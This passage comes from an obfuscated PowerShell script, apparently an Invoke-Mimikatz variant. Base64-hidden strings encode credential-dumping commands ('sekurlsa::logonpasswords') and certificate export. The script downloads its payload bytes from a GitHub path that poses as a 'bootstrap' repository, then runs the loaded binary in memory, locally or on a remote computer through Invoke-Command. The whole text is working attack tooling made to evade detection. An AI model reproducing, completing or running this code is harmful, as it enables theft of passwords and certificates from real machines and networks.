			${____/\/\__/\_____} = _/==\/\__/\__/==== -__/\/\/==\_/=\/\/= ${__/\/\/==\_/=\/\/=} -___/==\_/\/\_/\_/= $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjAA==')))
			if ((${____/\/\__/\_____} -eq $null) -or (${____/\/\__/\_____} -eq [IntPtr]::Zero))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjACAAYwBvAHUAbABkAG4AJwB0ACAAYgBlACAAZgBvAHUAbgBkACAAaQBuACAAdABoAGUAIABEAEwATAA=')))
			}
			${____/\/\__/\_____} = __/\/=\/\/=\_/\/\_ ${____/\/\__/\_____} ${__/\/\/==\_/=\/\/=}
			${____/\/\__/\_____} = _/=\___/\_/\__/\/\ ${____/\/\__/\_____} ${_/==\___/====\/\/}
			${_/\/====\_/==\/\_} = _/=\__/=\/==\/===\ -__/=\__/=\/=\_/\_/ ${__/\____/\/===\_/\} -____/=\_/=\_/\_/\_ ${____/\/\__/\_____} -Win32Functions $Win32Functions 
		}
		if (${__/\____/\/===\_/\} -eq [IntPtr]::Zero)
		{
			__/\/=\/\/====\_/= -__/\/\/==\_/=\/\/= ${__/\/\/==\_/=\/\/=}
		}
		else
		{
			${_/\/=\_/\/===\__/} = $Win32Functions.VirtualFree.Invoke(${__/\/\/==\_/=\/\/=}, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if (${_/\/=\_/\/===\__/} -eq $false)
			{
				Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
			}
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAhAA==')))
	}
	____/\/=\__/\_/=\_
}
Function ____/\/=\__/\_/=\_
{
	if (($PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA==')))].IsPresent)
	{
		$DebugPreference  = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABpAG4AdQBlAA==')))
	}
	Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAFAAcgBvAGMAZQBzAHMASQBEADoAIAAkAFAASQBEAA==')))
	if ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB1AG0AcABDAHIAZQBkAA=='))))
	{
		${_____/==\____/\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAGsAdQByAGwAcwBhADoAOgBsAG8AZwBvAG4AcABhAHMAcwB3AG8AcgBkAHMAIABlAHgAaQB0AA==')))
	}
    elseif ($PsCmdlet.ParameterSetName -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB1AG0AcABDAGUAcgB0AHMA'))))
    {
        ${_____/==\____/\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwByAHkAcAB0AG8AOgA6AGMAbgBnACAAYwByAHkAcAB0AG8AOgA6AGMAYQBwAGkAIAAiAGMAcgB5AHAAdABvADoAOgBjAGUAcgB0AGkAZgBpAGMAYQB0AGUAcwAgAC8AZQB4AHAAbwByAHQAIgAgACIAYwByAHkAcAB0AG8AOgA6AGMAZQByAHQAaQBmAGkAYwBhAHQAZQBzACAALwBlAHgAcABvAHIAdAAgAC8AcwB5AHMAdABlAG0AcwB0AG8AcgBlADoAQwBFAFIAVABfAFMAWQBTAFQARQBNAF8AUwBUAE8AUgBFAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQAiACAAZQB4AGkAdAA=')))
    }
    else
    {
        ${_____/==\____/\/=\} = $Command
    }
    [System.IO.Directory]::SetCurrentDirectory($pwd)
    ${_/\/==\/\/===\/=\} = New-Object Net.WebClient;
    ${/\____/\___/\_/\/} = ${_/\/==\/\/===\/=\}.DownloadString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBkAGkAbQBwAG8AbAAvAGIAbwBvAHQAcwB0AHIAYQBwAC8AdgA0AC0AZABlAHYALwBQAEUAYgB5AHQAZQBzADYANQAuAHQAeAB0AA=='))))
    ${_/\_/\_/\/====\/=} = ${_/\/==\/\/===\/=\}.DownloadString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBkAGkAbQBwAG8AbAAvAGIAbwBvAHQAcwB0AHIAYQBwAC8AdgA0AC0AZABlAHYALwBQAEUAYgB5AHQAZQBzADMAMgAuAHQAeAB0AA=='))))
	if ($ComputerName -eq $null -or $ComputerName -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcAHMAKgAkAA=='))))
	{
		icm -ScriptBlock ${_/=\__/\/\/=\/==\} -ArgumentList @(${/\____/\___/\_/\/}, ${_/\_/\_/\/====\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZAA='))), 0, "", ${_____/==\____/\/=\})
	}
	else
	{
		icm -ScriptBlock ${_/=\__/\/\/=\/==\} -ArgumentList @(${/\____/\___/\_/\/}, ${_/\_/\_/\/====\/=}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZAA='))), 0, "", ${_____/==\____/\/=\}) -ComputerName $ComputerName
	}
}
____/\/=\__/\_/=\_
}